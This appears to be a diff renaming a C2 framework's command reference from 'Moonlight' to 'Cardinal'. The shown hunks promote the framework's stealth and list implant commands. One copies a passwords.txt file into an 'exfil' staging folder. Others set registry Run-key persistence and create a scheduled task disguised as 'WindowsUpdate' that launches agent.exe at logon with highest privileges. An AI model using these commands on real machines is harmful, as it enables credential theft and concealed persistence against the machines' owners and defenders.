@@ -1,8 +1,8 @@
-# Moonlight C2 Framework - Complete Command Reference
+# Cardinal C2 Framework - Complete Command Reference
 
 ## Overview
 
-Moonlight C2 Framework now includes comprehensive monitoring and control capabilities implemented in x86 assembly for maximum stealth and performance. This document covers all available commands.
+Cardinal C2 Framework now includes comprehensive monitoring and control capabilities implemented in x86 assembly for maximum stealth and performance. This document covers all available commands.
 
 ---
 
@@ -541,7 +541,7 @@ file copy C:\Users\Admin\Documents\passwords.txt C:\Windows\Temp\exfil\p.txt
 persist
 
 # Verify registry entry
-reg read "Software\Microsoft\Windows\CurrentVersion\Run" MoonlightAgent
+reg read "Software\Microsoft\Windows\CurrentVersion\Run" CardinalAgent
 
 # Create scheduled task (via shell)
 shell schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\agent.exe" /sc onlogon /rl highest
